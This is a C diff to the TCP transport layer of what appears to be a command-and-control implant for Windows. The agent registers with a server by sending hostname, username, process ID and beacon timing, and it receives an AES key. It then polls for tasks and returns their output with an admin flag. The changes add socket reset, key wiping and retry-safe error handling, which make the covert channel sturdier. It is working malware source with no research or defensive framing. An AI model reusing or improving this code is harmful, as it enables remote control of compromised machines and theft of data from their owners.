@@ -17,6 +17,27 @@
 // Persistent TCP socket (opened during register, reused for beacon/result).
 static SOCKET g_tcp_sock = INVALID_SOCKET;
 
+static void tcp_reset(void) {
+    if (g_tcp_sock != INVALID_SOCKET) {
+        shutdown(g_tcp_sock, SD_BOTH);
+        closesocket(g_tcp_sock);
+        g_tcp_sock = INVALID_SOCKET;
+    }
+    memset(g_agent.agent_id, 0, sizeof(g_agent.agent_id));
+    memset(g_agent.aes_key, 0, sizeof(g_agent.aes_key));
+    g_agent.has_key = 0;
+}
+
+static int tcp_send_all(SOCKET s, const uint8_t *data, size_t len) {
+    size_t sent = 0;
+    while (sent < len) {
+        int n = send(s, (const char *)data + sent, (int)(len - sent), 0);
+        if (n <= 0) return 0;
+        sent += (size_t)n;
+    }
+    return 1;
+}
+
 // ── Framing helpers ───────────────────────────────────────────────────────────
 
 // Write 4-byte LE length prefix + data.
@@ -26,15 +47,8 @@ static int tcp_write_msg(SOCKET s, const uint8_t *data, size_t len) {
     hdr[1]=(uint8_t)((len>>8)&0xff);
     hdr[2]=(uint8_t)((len>>16)&0xff);
     hdr[3]=(uint8_t)((len>>24)&0xff);
-    if (send(s,(const char*)hdr,4,0)!=4) return 0;
-    if (len==0) return 1;
-    size_t sent=0;
-    while (sent<len) {
-        int r=send(s,(const char*)data+sent,(int)(len-sent),0);
-        if (r<=0) return 0;
-        sent+=r;
-    }
-    return 1;
+    if (!tcp_send_all(s, hdr, sizeof(hdr))) return 0;
+    return len == 0 || tcp_send_all(s, data, len);
 }
 
 // Read 4-byte LE length prefix then that many bytes. Caller must free().
@@ -161,10 +175,7 @@ static SOCKET tcp_connect(void) {
 // ── Transport operations ──────────────────────────────────────────────────────
 
 int transport_tcp_register(void) {
-    if (g_tcp_sock != INVALID_SOCKET) {
-        closesocket(g_tcp_sock);
-        g_tcp_sock = INVALID_SOCKET;
-    }
+    tcp_reset();
     g_tcp_sock = tcp_connect();
     if (g_tcp_sock == INVALID_SOCKET) return 0;
 
@@ -190,22 +201,35 @@ int transport_tcp_register(void) {
         hostname, username_j, (unsigned long)GetCurrentProcessId(),
         AGENT_SLEEP_SEC, AGENT_JITTER_PCT, AGENT_PARENT_ID);
 
-    if (!tcp_send_register(body)) return 0;
+    if (!tcp_send_register(body)) {
+        tcp_reset();
+        return 0;
+    }
 
     // Server responds with plaintext {"t":"register_resp","p":{"agent_id":"...","aes_key":"...",...}}
     char *resp_raw = tcp_recv_raw();
-    if (!resp_raw) return 0;
+    if (!resp_raw) {
+        tcp_reset();
+        return 0;
+    }
 
     char agent_id[64]={0}, aes_key_b64[128]={0};
     agent_json_str(resp_raw, "agent_id", agent_id, sizeof(agent_id));
     agent_json_str(resp_raw, "aes_key",  aes_key_b64, sizeof(aes_key_b64));
     free(resp_raw);
 
-    if (!agent_id[0] || !aes_key_b64[0]) return 0;
+    if (!agent_id[0] || !aes_key_b64[0]) {
+        tcp_reset();
+        return 0;
+    }
 
     size_t key_len=0;
     uint8_t *key = b64_decode(aes_key_b64, &key_len);
-    if (!key || key_len < 32) { free(key); return 0; }
+    if (!key || key_len < 32) {
+        free(key);
+        tcp_reset();
+        return 0;
+    }
 
     strncpy(g_agent.agent_id, agent_id, sizeof(g_agent.agent_id) - 1);
     memcpy(g_agent.aes_key, key, 32);
@@ -218,10 +242,16 @@ AgentTask* transport_tcp_beacon(int *count) {
     *count = 0;
     if (g_tcp_sock == INVALID_SOCKET || !g_agent.has_key) return NULL;
 
-    if (!tcp_send_enc("beacon", "{}")) return NULL;
+    if (!tcp_send_enc("beacon", "{}")) {
+        tcp_reset();
+        return NULL;
+    }
 
     char *resp_plain = tcp_recv_enc();
-    if (!resp_plain) return NULL;
+    if (!resp_plain) {
+        tcp_reset();
+        return NULL;
+    }
 
     AgentTask *tasks = agent_parse_tasks((const uint8_t*)resp_plain,
                                          strlen(resp_plain), count);
@@ -241,10 +271,15 @@ void transport_tcp_send_result(long long task_id, const char *output,
         task_id, output?output:"", error?error:"",
         is_admin?"true":"false");
 
-    tcp_send_enc("result", body);
+    if (!tcp_send_enc("result", body)) {
+        free(body);
+        tcp_reset();
+        return;
+    }
     free(body);
 
     // Drain plaintext ACK {"t":"ack"} — no encrypted payload
     char *ack = tcp_recv_raw();
+    if (!ack) tcp_reset();
     free(ack);
 }
